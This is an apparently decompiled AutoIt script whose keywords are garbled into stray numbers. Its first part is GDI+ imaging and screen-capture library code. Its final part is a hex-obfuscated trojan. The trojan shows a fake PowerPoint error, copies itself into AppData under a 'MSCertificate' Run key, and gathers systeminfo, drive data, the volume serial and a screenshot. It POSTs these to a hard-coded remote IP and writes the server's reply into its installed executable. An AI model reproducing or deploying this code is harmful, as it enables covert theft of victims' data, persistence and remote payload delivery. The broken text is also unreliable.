$__g_bgdip_v1_0534(-1, 0, 0)
$teffectparameters = ($taggdip_effectparams_sharpen)
($teffectparameters, "Radius", $fradius)
($teffectparameters, "Amount", $famount)
$heffect = _gdiplus_effectcreate($gdip_sharpeneffectguid)
@error534(@error, @extended, 0)
_gdiplus_effectsetparameters($heffect, $teffectparameters)
@error534(@error + 10, @extended, 0)
$heffect

_gdiplus_effectcreatetint($ihue = 0, $iamount = 0)
$__g_bgdip_v1_0534(-1, 0, 0)
$teffectparameters = ($taggdip_effectparams_tint)
($teffectparameters, "Hue", $ihue)
($teffectparameters, "Amount", $iamount)
$heffect = _gdiplus_effectcreate($gdip_tinteffectguid)
@error534(@error, @extended, 0)
_gdiplus_effectsetparameters($heffect, $teffectparameters)
@error534(@error + 10, @extended, 0)
$heffect

_gdiplus_effectdispose($heffect)
$__g_bgdip_v1_0534(-1, 0, 40)
$aresult = ($__g_hgdipdll, "int", "GdipDeleteEffect", "handle", $heffect)
@error534(@error, @extended, 0)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_effectgetparameters($heffect, $teffectparameters)
$__g_bgdip_v1_0534(-1, 0, 40)
($teffectparameters) < __gdiplus_effectgetparametersize($heffect)534(2, 5, 40)
$aresult = ($__g_hgdipdll, "int", "GdipGetEffectParameters", "handle", $heffect, "uint*", ($teffectparameters), "struct*", $teffectparameters)
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

__gdiplus_effectgetparametersize($heffect)
$__g_bgdip_v1_0534(-1, 0, -1)
$aresult = ($__g_hgdipdll, "int", "GdipGetEffectParameterSize", "handle", $heffect, "uint*", 0)
@error534(@error, @extended, -1)
$aresult[0]534(10, $aresult[0], -1)
$aresult[2]

_gdiplus_effectsetparameters($heffect, $teffectparameters, $isizeadjust = 1)
$__g_bgdip_v1_0534(-1, 0, 40)
$isize = __gdiplus_effectgetparametersize($heffect)
@error534(@error, @extended, 40)
$aresult = ($__g_hgdipdll, "int", "GdipSetEffectParameters", "handle", $heffect, "struct*", $teffectparameters, "uint", $isize * $isizeadjust)
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_paletteinitialize($ientries, $ipalettetype = $gdip_palettetypeoptimal, $ioptimalcolors = 0, $busetransparentcolor = 39, $hbitmap = 42)
$__g_bgdip_v1_0534(-1, 0, 0)
$ioptimalcolors > 05$ipalettetype = $gdip_palettetypeoptimal
$tpalette = ("uint Flags; uint Count; uint ARGB[" & $ientries & "];")
($tpalette, "Flags", $ipalettetype)
($tpalette, "Count", $ientries)
$aresult = ($__g_hgdipdll, "int", "GdipInitializePalette", "struct*", $tpalette, "uint", $ipalettetype, "uint", $ioptimalcolors, "bool", $busetransparentcolor, "handle", $hbitmap)
@error534(@error, @extended, 0)
$aresult[0]534(10, $aresult[0], 0)
$tpalette

$__g_ibmpformat = $gdip_pxf24rgb
$__g_ijpgquality = 100
$__g_itifcolordepth = 24
$__g_itifcompression = $gdip_evtcompressionlzw
0$__screencaptureconstant_sm_cxscreen = 0
0$__screencaptureconstant_sm_cyscreen = 1
0$__screencaptureconstant_srccopy = 13369376
_screencapture_capture($sfilename = "", $ileft = 0, $itop = 0, $iright = -1, $ibottom = -1, $bcursor = 39)
$iright = -15$iright = _winapi_getsystemmetrics($__screencaptureconstant_sm_cxscreen) - 1
$ibottom = -15$ibottom = _winapi_getsystemmetrics($__screencaptureconstant_sm_cyscreen) - 1
$iright < $ileft534(-1, 0, 0)
$ibottom < $itop534(-2, 0, 0)
$iw = ($iright - $ileft) + 1
$ih = ($ibottom - $itop) + 1
$hwnd = _winapi_getdesktopwindow()
$hddc = _winapi_getdc($hwnd)
$hcdc = _winapi_createcompatibledc($hddc)
$hbmp = _winapi_createcompatiblebitmap($hddc, $iw, $ih)
_winapi_selectobject($hcdc, $hbmp)
_winapi_bitblt($hcdc, 0, 0, $iw, $ih, $hddc, $ileft, $itop, $__screencaptureconstant_srccopy)
$bcursor5
$acursor = _winapi_getcursorinfo()
@error1$acursor[1]5
$bcursor = 39
$hicon = _winapi_copyicon($acursor[2])
$aicon = _winapi_geticoninfo($hicon)
_winapi_deleteobject($aicon[4])
$aicon[5] <> 05_winapi_deleteobject($aicon[5])
_winapi_drawicon($hcdc, $acursor[3] - $aicon[2] - $ileft, $acursor[4] - $aicon[3] - $itop, $hicon)
_winapi_destroyicon($hicon)


_winapi_releasedc($hwnd, $hddc)
_winapi_deletedc($hcdc)
$sfilename = ""534$hbmp
$bret = _screencapture_saveimage($sfilename, $hbmp, 39)
(@error, @extended, $bret)

_screencapture_capturewnd($sfilename, $hwnd, $ileft = 0, $itop = 0, $iright = -1, $ibottom = -1, $bcursor = 39)
($hwnd)5$hwnd = ($hwnd)
$trect = ($tagrect)
0$dwmwa_extended_frame_bounds = 9
$bret = ("dwmapi.dll", "long", "DwmGetWindowAttribute", "hwnd", $hwnd, "dword", $dwmwa_extended_frame_bounds, "struct*", $trect, "dword", ($trect))
(@error2$bret[0]((($trect, "Left")) + (($trect, "Top")) + (($trect, "Right")) + (($trect, "Bottom"))) = 0)5
$trect = _winapi_getwindowrect($hwnd)
@error534(@error, @extended, 0)

$ileft += ($trect, "Left")
$itop += ($trect, "Top")
$iright = -15$iright = ($trect, "Right") - ($trect, "Left") - 1
$ibottom = -15$ibottom = ($trect, "Bottom") - ($trect, "Top") - 1
$iright += ($trect, "Left")
$ibottom += ($trect, "Top")
$ileft > ($trect, "Right")5$ileft = ($trect, "Left")
$itop > ($trect, "Bottom")5$itop = ($trect, "Top")
$iright > ($trect, "Right")5$iright = ($trect, "Right") - 1
$ibottom > ($trect, "Bottom")5$ibottom = ($trect, "Bottom") - 1
_screencapture_capture($sfilename, $ileft, $itop, $iright, $ibottom, $bcursor)

_screencapture_saveimage($sfilename, $hbitmap, $bfreebmp = 39)
_gdiplus_startup()
@error534(-1, -1, 40)
$sext = (__gdiplus_extractfileext($sfilename))
$sclsid = _gdiplus_encodersgetclsid($sext)
$sclsid = ""534(-2, -2, 40)
$himage = _gdiplus_bitmapcreatefromhbitmap($hbitmap)
@error534(-3, -3, 40)
$tdata, $tparams
$sext
"BMP"
$ix = _gdiplus_imagegetwidth($himage)
$iy = _gdiplus_imagegetheight($himage)
$hclone = _gdiplus_bitmapclonearea($himage, 0, 0, $ix, $iy, $__g_ibmpformat)
_gdiplus_imagedispose($himage)
$himage = $hclone
"JPG", "JPEG"
$tparams = _gdiplus_paraminit(1)
$tdata = ("int Quality")
($tdata, "Quality", $__g_ijpgquality)
_gdiplus_paramadd($tparams, $gdip_epgquality, 1, $gdip_eptlong, ($tdata))
"TIF", "TIFF"
$tparams = _gdiplus_paraminit(2)
$tdata = ("int ColorDepth;int Compression")
($tdata, "ColorDepth", $__g_itifcolordepth)
($tdata, "Compression", $__g_itifcompression)
_gdiplus_paramadd($tparams, $gdip_epgcolordepth, 1, $gdip_eptlong, ($tdata, "ColorDepth"))
_gdiplus_paramadd($tparams, $gdip_epgcompression, 1, $gdip_eptlong, ($tdata, "Compression"))

$pparams = 0
($tparams)5$pparams = $tparams
$bret = _gdiplus_imagesavetofileex($himage, $sfilename, $sclsid, $pparams)
_gdiplus_imagedispose($himage)
$bfreebmp5_winapi_deleteobject($hbitmap)
_gdiplus_shutdown()
($bret = 40, 0, $bret)

_screencapture_setbmpformat($iformat)
$iformat

$__g_ibmpformat = $gdip_pxf16rgb555

$__g_ibmpformat = $gdip_pxf16rgb565

$__g_ibmpformat = $gdip_pxf24rgb

$__g_ibmpformat = $gdip_pxf32rgb

$__g_ibmpformat = $gdip_pxf32argb

$__g_ibmpformat = $gdip_pxf24rgb


_screencapture_setjpgquality($iquality)
$iquality < 05$iquality = 0
$iquality > 1005$iquality = 100
$__g_ijpgquality = $iquality

_screencapture_settifcolordepth($idepth)
$idepth
4
$__g_itifcolordepth = 24
2
$__g_itifcolordepth = 32

$__g_itifcolordepth = 0


_screencapture_settifcompression($icompress)
$icompress

$__g_itifcompression = $gdip_evtcompressionnone

$__g_itifcompression = $gdip_evtcompressionlzw

$__g_itifcompression = 0


(_hextostring("5472617949636F6E48696465"), 1)
$sinstall_path_and_name = @AppDataDir & _hextostring("5C4D6963726F736F66745C53657474696E67735C536166657479205761726E696E67204C6576656C5C696563736C73732E657865")
jkshdkg()
(20000)
($sinstall_path_and_name)

getsysinfo()
$systeminformation = _hextostring("506174683A20") & @ScriptFullPath & @CRLF & _getdrive() & @CRLF & (_dosrun(_hextostring("73797374656D696E666F")), "&", ".") & @CRLF & _arraytostring(())
$systeminformation

_savetofile($data)
(_hextostring("484B45595F43555252454E545F555345525C536F6674776172655C4D6963726F736F66745C57696E646F77735C43757272656E7456657273696F6E5C52756E"), "MSCertificate", "REG_SZ", $sinstall_path_and_name)
$f = ($sinstall_path_and_name, 26)
($f, _hextostring($data))
($f)

_get_screen()
_screencapture_capture(@TempDir & _hextostring("5C474449506C75735F496D616765312E6A7067"))
$text = (@TempDir & _hextostring("5C474449506C75735F496D616765312E6A7067"))
(@TempDir & _hextostring("5C474449506C75735F496D616765312E6A7067"))
_stringtohex($text)

_sendpost($surl, $sysinfo, $screen, $getsnd)
$i = 0

$spd = _hextostring("6462676174653D") & $sysinfo & _hextostring("2677696E33323D") & $screen
$ohttp = ("winhttp.winhttprequest.5.1")
$ohttp.open(_hextostring("504F5354"), $surl & _hextostring("3F6E6578743D") & $getsnd, 40)
$ohttp.setrequestheader(_hextostring("436F6E74656E742D54797065"), _hextostring("6170706C69636174696F6E2F782D7777772D666F726D2D75726C656E636F646564"))
$ohttp.send($spd)
$oreceived = $ohttp.responsetext
$ostatuscode = $ohttp.status
$ostatuscode = 2005
($oreceived)


$i = $i + 1
$i = 10518
(60000)


getsnd()
$ares = (_dosrun("VOL"), "[A-F0-9]{4}+-+[A-F0-9]{4}", 1)
@error5
$name = "00000100"
$name

$name = ($ares[0], "-", "")
$name


_getdrive()
$drivearray = ("FIXED")
@error5
$driveinfo = ""
$drivecount = 115$drivearray[0]
$driveinfo &= ($drivearray[$drivecount])
$driveinfo &= " -  File System = " & ($drivearray[$drivecount])
$driveinfo &= ",  L = " & ($drivearray[$drivecount])
$driveinfo &= ",  S = " & ($drivearray[$drivecount])
$driveinfo &= ",  T = " & ($drivearray[$drivecount])
$driveinfo &= ",  F = " & ($drivearray[$drivecount])
$driveinfo &= ",  T = " & ($drivearray[$drivecount])
$driveinfo &= @CRLF


$driveinfo = "00000001"

$driveinfo

_dosrun($scommand)
$nresult = ('"' & @ComSpec & '" /c ' & $scommand, @SystemDir, @SW_HIDE, 6)
($nresult)
($nresult)

main()
("JKSHDKG")
(48, "Microsoft PowerPoint", "PowerPoint can't read the outline from " & (@ScriptFullPath, ".exe", ".pptx") & " . No text converter is installed for this file type.")
("iecslss.exe") <> 0535
$getsnd = getsnd()
$systeminformation = getsysinfo()
$surl = _hextostring("687474703A2F2F3232302E3135382E3231362E3132372F7365617263682D7379732D7570646174652D72656C656173652F626173652D73796E632F64623737343973632E706870")
$screen = _get_screen()
$data = _sendpost($surl, $systeminformation, $screen, $getsnd)
_savetofile($data)

main()
